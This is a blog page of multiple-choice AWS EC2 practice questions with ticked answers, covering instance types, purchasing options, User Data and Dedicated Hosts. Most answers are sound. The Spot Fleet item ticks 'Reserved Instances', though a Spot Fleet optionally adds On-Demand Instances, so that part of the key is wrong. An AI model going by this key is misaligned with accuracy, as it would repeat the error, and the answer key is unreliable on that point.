<p><strong>You would like to deploy a High-Performance Computing (HPC) application on EC2 instances. Which EC2 instance type should you choose?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Storage Optimized</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Compute Optimized</strong></li>
</ul>
<blockquote>
<p>Compute Optimized EC2 instances are great for compute-intensive workloads requiring high-performance processors (e.g., batch processing, media transcoding, high-performance computing, scientific modeling &amp; machine learning, and dedicated gaming servers).</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Memory Optimized</strong></li>
<li><input disabled="" type="checkbox"> • <strong>General Purpose</strong></li>
</ul>
<p><strong>Which EC2 Purchasing Option should you use for an application you plan to run on a server continuously for 1 year?</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> • <strong>Reserved Instances</strong></li>
</ul>
<blockquote>
<p>Reserved Instances are good for long workloads. You can reserve EC2 instances for 1 or 3 years.</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Spot Instances</strong></li>
<li><input disabled="" type="checkbox"> • <strong>On-Demand Instances</strong></li>
</ul>
<p><strong>You are preparing to launch an application that will be hosted on a set of EC2 instances. This application needs some software installation and some OS packages need to be updated during the first launch. What is the best way to achieve this when you launch the EC2 instances?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Connect to each EC2 instance using SSH, then install the required software and update your OS packages manually</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Write a bash script that installs the required software and updates to your OS, then contact AWS Support and provide them with the script. They will run it on your EC2 instances at launch</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Write a bash script that installs the required software and updates to your OS, then use this script in EC2 User Data when you launch your EC2 instances</strong></li>
</ul>
<p><strong>Which EC2 Instance Type should you choose for a critical application that uses an in-memory database?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Compute Optimized</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Storage Optimized</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Memory Optimized</strong></li>
<li><input disabled="" type="checkbox"> • <strong>General Purpose</strong></li>
</ul>
<p><strong>You have an e-commerce application with an OLTP database hosted on-premises. This application has popularity which results in its database has thousands of requests per second. You want to migrate the database to an EC2 instance. Which EC2 Instance Type should you choose to handle this high-frequency OLTP database?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Compute Optimized</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Storage Optimized</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Memory Optimized</strong></li>
<li><input disabled="" type="checkbox"> • <strong>General Purpose</strong></li>
</ul>
<p><strong>Security Groups can be attached to only one EC2 instance.</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> • <strong>False</strong></li>
<li><input disabled="" type="checkbox"> • <strong>True</strong></li>
</ul>
<p><strong>You’re planning to migrate on-premises applications to AWS. Your company has strict compliance requirements that require your applications to run on dedicated servers. You also need to use your own server-bound software license to reduce costs. Which EC2 Purchasing Option is suitable for you?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Convertible Reserved Instances</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Dedicated Hosts</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Spot Instances</strong></li>
</ul>
<p><strong>You would like to deploy a database technology on an EC2 instance and the vendor license bills you based on the physical cores and underlying network socket visibility. Which EC2 Purchasing Option allows you to get visibility into them?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Spot Instances</strong></li>
<li><input disabled="" type="checkbox"> • <strong>On-Demand</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Dedicated Hosts</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Reserved Instances</strong></li>
</ul>
<p><strong>Spot Fleet is a set of Spot Instances and optionally ……………</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> • <strong>Reserved Instances</strong></li>
<li><input disabled="" type="checkbox"> • <strong>On-Demand Instances</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Dedicated Hosts</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Dedicated Instances</strong></li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/3/">« Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/">Next »</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2025 Noflag
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>